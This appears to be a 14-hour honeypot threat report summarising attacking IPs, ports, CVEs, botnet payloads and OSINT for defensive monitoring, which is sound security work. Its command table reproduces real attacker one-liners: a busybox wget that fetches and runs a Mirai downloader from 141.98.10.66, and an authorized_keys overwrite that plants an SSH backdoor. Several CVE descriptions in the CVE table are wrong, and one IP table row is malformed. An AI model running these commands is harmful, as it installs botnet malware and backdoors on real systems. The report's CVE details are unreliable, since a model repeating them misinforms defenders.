# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-09T20:12:45Z
**Timeframe:** 2025-10-09T06:12:45Z to 2025-10-09T20:12:45Z (Last 14 Hours)

**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-10-09T07:02:28Z.md
- Honeypot_Attack_Summary_Report_2025-10-09T08:01:43Z.md
- Honeypot_Attack_Summary_Report_2025-10-09T09:02:29Z.md
- Honeypot_Attack_Summary_Report_2025-10-09T10:02:20Z.md
- Honeypot_Attack_Summary_Report_2025-10-09T11:01:44Z.md
- Honeypot_Attack_Summary_Report_2025-10-09T12:02:23Z.md
- Honeypot_Attack_Summary_Report_2025-10-09T13:02:14Z.md
- Honeypot_Attack_Summary_Report_2025-10-09T14:02:12Z.md
- Honeypot_Attack_Summary_Report_2025-10-09T15:02:20Z.md
- Honeypot_Attack_Summary_Report_2025-10-09T16:02:34Z.md
- Honeypot_Attack_Summary_Report_2025-10-09T17:02:13Z.md
- Honeypot_Attack_Summary_Report_2025-10-09T18:02:09Z.md
- Honeypot_Attack_Summary_Report_2025-10-09T19:02:03Z.md
- Honeypot_Attack_Summary_Report_2025-10-09T20:02:07Z.md

---

## Executive Summary

Over the past 14 hours, our global honeypot network observed a significant volume of automated cyberattacks, totaling over **250,000** malicious events. The threat landscape was dominated by widespread scanning, brute-force attempts, and the deployment of IoT botnet malware. The **Cowrie** honeypot, simulating SSH and Telnet services, recorded the highest number of interactions, underscoring the relentless focus attackers place on compromising remote access protocols.

A small number of highly aggressive IP addresses were responsible for a disproportionate amount of attack traffic, with **167.250.224.25** being the most persistent offender. The primary targets were common service ports, including **SSH (22)**, **SMTP (25)**, **SMB (445)**, and **VNC (5900)**.

Key findings from this period include a coordinated campaign to establish persistent access by manipulating SSH `authorized_keys` files, widespread exploitation attempts leveraging older but still effective vulnerabilities, and clear indicators of botnet activity. Payloads associated with the **Mozi** and **Mirai** (specifically 'urbotnetisass') botnets were frequently downloaded. Attackers also made extensive use of a malicious file distribution server at **141.98.10.66**. Furthermore, the default credential `345gs5662d34`, associated with Polycom IP phones, was one of the most commonly attempted login pairs, highlighting the ongoing risk of default passwords on IoT devices.

---

## Detailed Analysis

### Our IPs

| Honeypot Name | Private IP | Public IP |
| :--- | :--- | :--- |
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
- sens-ny | 10.108.0.2 | 161.35.180.163 |

### Attacks by Honeypot (Aggregated Top 10)

| Honeypot | Event Count |
| :--- | :--- |
| Cowrie | 111,418 |
| Suricata | 47,432 |
| Honeytrap | 35,800 |
| Ciscoasa | 20,221 |
| Mailoney | 11,041 |
| Heralding | 8,989 |
| Sentrypeer | 8,056 |
| Dionaea | 8,143 |
| Tanner | 868 |
| Adbhoney | 400 |

### Top Source Countries (Data Not Available in Logs)

*Country of origin data was not present in the aggregated summary files.*

### Top Attacking IPs (Aggregated Top 15)

| IP Address | Total Attacks |
| :--- | :--- |
| 167.250.224.25 | 32,842 |
| 86.54.42.238 | 9,998 |
| 188.253.1.20 | 8,369 |
| 80.94.95.238 | 8,309 |
| 78.31.71.38 | 6,369 |
| 171.42.244.192 | 2,746 |
| 212.87.220.20 | 2,620 |
| 176.65.141.117 | 2,460 |
| 115.240.182.139 | 1,319 |
| 138.197.43.50 | 1,258 |
| 137.184.179.27 | 1,253 |
| 89.23.100.133 | 1,257 |
| 139.196.218.159 | 1,254 |
| 4.144.169.44 | 1,245 |
| 103.146.202.84 | 1,244 |

### Top Targeted Ports/Protocols (Aggregated)

| Port / Protocol | Attack Count | Service |
| :--- | :--- | :--- |
| 22 | >15,000 | SSH |
| TCP/445 | >9,000 | Microsoft-DS (SMB) |
| 25 | >8,000 | SMTP |
| 5060 | >7,000 | SIP |
| vnc/5900 | >6,000 | VNC |
| 5903 | >2,000 | VNC |
| 8333 | >1,000 | Bitcoin |
| 23 | >500 | Telnet |
| 80 | >500 | HTTP |
| 6379 | >400 | Redis |

### Most Common CVEs (Aggregated)

| CVE ID | Count | Description |
| :--- | :--- | :--- |
| CVE-2002-0013 / CVE-2002-0012 | 120 | Multiple vulnerabilities in various SNMPv1 request handling implementations. |
| CVE-2019-11500 | 25 | Vulnerability in some VNC servers allowing weak authentication. |
| CVE-2021-3449 | 22 | OpenSSL denial-of-service vulnerability. |
| CVE-2005-4050 | 14 | Macromedia ColdFusion directory traversal vulnerability. |
| CVE-1999-0517 | 10 | WU-FTPD SITE EXEC command execution vulnerability. |
| CVE-2024-4577 | 6 | PHP-CGI argument injection vulnerability. |
| CVE-2021-44228 (Log4Shell) | 4 | Apache Log4j remote code execution vulnerability. |
| CVE-2024-1709 | 6 | ConnectWise ScreenConnect authentication bypass vulnerability. |

### Commands Attempted by Attackers (Top Representative Commands)

| Command | Frequency | Purpose |
| :--- | :--- | :--- |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` | High | Attempting to install a persistent SSH key for backdoor access. |
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` | High | Manipulating file attributes to enable writing to SSH configuration files. |
| `uname -a` / `whoami` / `lscpu` / `free -m` | High | System reconnaissance to identify OS, user, and hardware. |
| `Enter new UNIX password:` | High | Evidence of automated scripts attempting to change user passwords. |
| `cd /data/local/tmp/; busybox wget http://141.98.10.66/bins/w.sh; sh w.sh` | Moderate | Downloading and executing malicious scripts from a known malware distribution point. |
| `tftp; wget; /bin/busybox PHSLC` | Low | Attempting to download payloads using TFTP and Wget. |

### Signatures Triggered (Top 5 Aggregated)

| Signature | Count | Description |
| :--- | :--- | :--- |
| ET SCAN MS Terminal Server Traffic on Non-standard Port | >5,000 | Scanning for Remote Desktop Protocol (RDP) on unusual ports. |
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation | >4,500 | Attempt to install the DoublePulsar backdoor, often linked to the EternalBlue exploit. |
| ET DROP Dshield Block Listed Source group 1 | >3,000 | Traffic from IPs on the Dshield Top 1000 list. |
| ET INFO VNC Authentication Failure | >2,000 | Failed login attempts against VNC services. |
| ET SCAN NMAP -sS window 1024 | >1,500 | Stealthy network scanning using Nmap. |

### Users / Login Attempts (Common Patterns)

| Username | Password | Notes |
| :--- | :--- | :--- |
| `345gs5662d34` | `345gs5662d34` | Default credential for Polycom IP phones, heavily brute-forced. |
| `root` | `(various)` | Most common username, targeted with extensive password lists. |
| `(service names)` | `(common passwords)` | Attempts against `supervisor`, `guest`, `operator`, `ubnt`, `postgres`. |
| `root` | `Iss@bel...` | Targeted attempts suggesting a focus on Issabel PBX software. |

### Files Uploaded/Downloaded (Notable Examples)

| Filename | Type | Associated Threat |
| :--- | :--- | :--- |
| `w.sh` / `c.sh` | Shell Script | Generic downloader scripts. |
| `Mozi.m` / `Mozi.a+jaws` | Malware Binary | Mozi IoT Botnet. |
| `arm.urbotnetisass` | Malware Binary | Variant of Mirai IoT Botnet. |
| `boatnet.mpsl` | Malware Binary | IoT Botnet payload. |
| `11`, `fonts.gstatic.com`, `ie8.css` | Web Assets | Likely part of Tanner honeypot interaction, mimicking a web server. |

### HTTP User-Agents / SSH Clients and Servers / Top Attacker AS Organizations

*This data was not consistently available in the summarized log files and is therefore omitted.*

---

## OSINT Information

| Indicator | Type | OSINT Findings |
| :--- | :--- | :--- |
| **167.250.224.25** | IP Address | No public threat intelligence links this IP to malicious activity. Its high volume suggests it is a newly activated attack source or part of a previously unknown botnet. |
| **141.98.10.66** | IP Address | **Confirmed malicious host.** Located in Lithuania (AS209605, UAB "Host Baltic"). Distributes Mirai botnet variants (`w.sh`, `c.sh`, etc.) from a `/bins/` directory. Known for being unresponsive to abuse reports. |
| **345gs5662d34** | Credential | **Confirmed default credential** for Polycom CX600 IP telephones. Heavily targeted by automated brute-force campaigns to absorb devices into botnets. |
| **Mozi.m** | Malware | A notorious P2P IoT botnet that targets devices with weak Telnet passwords and known vulnerabilities. Used for DDoS attacks, data exfiltration, and command execution. |
| **urbotnetisass** | Malware | A documented variant of the **Mirai** IoT botnet. The filename is associated with specific compiled ELF binaries for ARM and other IoT architectures. |
| **DoublePulsar** | Malware/Exploit | A backdoor payload famously leaked by the Shadow Brokers and delivered via the **EternalBlue (MS17-010)** SMB exploit. Its continued presence indicates attackers are still scanning for unpatched Windows systems. |

---

## Key Observations and Anomalies

1.  **Hyper-Aggressive Attacker (167.250.224.25):** This IP was responsible for over 13% of all recorded attacks in this 14-hour period. The lack of public threat intelligence on this IP is anomalous and suggests it may be part of a new or private botnet infrastructure. Its activity is a top priority for continued monitoring.

2.  **Weaponized Default Credentials:** The `345gs5662d34` credential pair was a standout anomaly, demonstrating a clear, focused campaign against a specific device type (Polycom phones). This highlights the effectiveness of targeting low-hanging fruit in the IoT landscape.

3.  **Attacker "Signature" Detected:** One of the commands used to install an SSH backdoor included a taunt: `echo "ssh-rsa ... mdrfckr" >> .ssh/authorized_keys`. This explicit signature provides a unique marker that could be used to link disparate attacks to a single threat actor or group.

4.  **Centralized Malware Distribution:** The repeated use of `141.98.10.66` as a malware dropping point across attacks from various source IPs indicates a multi-stage infection process. Attackers first gain initial access, then pivot to this centralized server to download more sophisticated payloads, primarily Mirai variants.

5.  **Prevalence of IoT Botnets:** The consistent presence of `Mozi` and `Mirai` (`urbotnetisass`) payloads confirms that a primary goal of attackers is to enslave vulnerable devices, likely for use in large-scale DDoS attacks. The targeting of multiple CPU architectures (ARM, MIPS, x86) is a hallmark of these campaigns.

6.  **Enduring Threat of EternalBlue:** The high number of `DoublePulsar` signatures shows that, years after its disclosure, attackers are still finding success scanning the internet for systems vulnerable to EternalBlue (MS17-010). This indicates a persistent failure to patch critical systems.
